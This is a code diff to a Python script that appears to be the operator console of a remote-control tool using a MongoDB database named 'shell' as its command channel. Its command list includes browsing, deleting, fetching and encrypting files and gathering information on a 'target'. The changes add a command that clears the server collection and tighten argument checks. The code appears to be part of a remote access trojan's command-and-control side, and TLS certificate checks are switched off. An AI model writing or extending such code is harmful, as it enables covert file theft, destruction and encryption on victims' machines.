@@ -18,7 +18,7 @@ client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles']
+MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver']
 
 CWD=r""
 LAST_PATH=""
@@ -176,7 +176,7 @@ def ActionUploader():
             print(i)
         print()
 
-    elif a[0]=='showimg':
+    elif a[0]=='showimg' and len(a)==2:
         target_element=a[1]
         data={
                 "action":a[0],
@@ -201,10 +201,12 @@ def ActionUploader():
         except Exception as e:
                 print(e)
         
-    elif a[0]=='targetinfo':
+    elif a[0]=='targetinfo' and len(a)==1:
         targetInfo()
+    elif a[0]=='refreshserver' and len(a)==1:
+        clearCollection()
 
-    elif a[0]=='getalltypefiles':
+    elif a[0]=='getalltypefiles' and len(a)==2:
         target_element=a[1]
         data={
                 "action":a[0],
